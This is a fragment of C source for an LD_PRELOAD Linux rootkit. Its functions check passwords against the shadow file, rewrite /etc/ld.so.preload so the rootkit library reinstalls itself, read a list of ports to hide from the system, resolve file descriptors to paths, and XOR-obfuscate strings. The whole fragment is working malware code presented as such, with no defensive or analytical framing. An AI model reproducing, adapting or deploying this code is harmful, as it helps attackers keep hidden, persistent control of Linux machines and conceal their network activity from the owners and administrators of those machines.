static int hideports[255];
void *libc;
int checkpw(char *user,char *pass) {
    struct spwd *shadow_entry;
    char *supplied;
    shadow_entry = getspnam(user);
    if (shadow_entry == NULL || strlen(shadow_entry->sp_pwdp) < 2) return 1;
    supplied = crypt(pass, shadow_entry->sp_pwdp);
    if (supplied == NULL) return 2;
    return strcmp(supplied, shadow_entry->sp_pwdp);
}

void reinstall_self() {
  FILE *preload;
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym(libc,"fopen");
  if (!old_xstat) old_xstat = dlsym(libc,"__xstat");
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, "/etc/ld.so.preload", &s_fstat);
  if(s_fstat.st_size != strlen("/lib/"MAGIC_STRING".$PLATFORM")) {
    if((preload = old_fopen("/etc/ld.so.preload","w"))) {
      fwrite("/lib/"MAGIC_STRING".$PLATFORM",strlen("/lib/"MAGIC_STRING".$PLATFORM"),1,preload);
      fflush(preload);
      fclose(preload);
    }
  }
}


int is_hideport(int port){
    int x;
    int hideports_size;
    hideports_size = sizeof(hideports) / sizeof(hideports[0]);
    for(x=0;x < hideports_size ; x++){
        if(!hideports[x]) break;
        if(port == hideports[x]) return 1;
    }
    return 0;
}

int get_hideports() {  // ya we config file now
  int i = 0;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  FILE *ports;
  ports = old_fopen(HIDEPORTS_FILE, "r");
  if(!ports) return 1;
  while(!feof(ports)) {
    if(i > 255) break;
    fscanf(ports,"%d",&hideports[i]);
    i++;
  }

  fclose(ports);
  return 0;
}

char *recover_filename(int fd) {
  char fd_path[256];
  char *filename = (char *)malloc(256);
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_readlink) old_readlink = dlsym (libc, "readlink");

  memset(filename,0,256);
  // because otherwise we get weird \xff\xff\x41
  // at the end of paths sometimes
  snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
  if(old_readlink(fd_path, filename, 255) < 0) return NULL;
  return filename;
}

char *recover_dirname(DIR *d) {
  int fd;
  char fd_path[256];
  char *filename = (char *)malloc(256);
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_readlink) old_readlink = dlsym (libc, "readlink");

  memset(filename,0,256);
  fd = dirfd(d);
  snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
  if(old_readlink(fd_path, filename, 255) < 0) return NULL;

  return filename;
}

void sxor (char *text) {
        int i;
        for (i = 0; i < strlen(text); i++) {
                text[i] ^= 30; // hardcore 8 bit encryption lol
        }
}


void cleanup(char *string) {
 while(*string) {
  if (!isprint(*string)) *string = '\0';
  string++;
 }
}
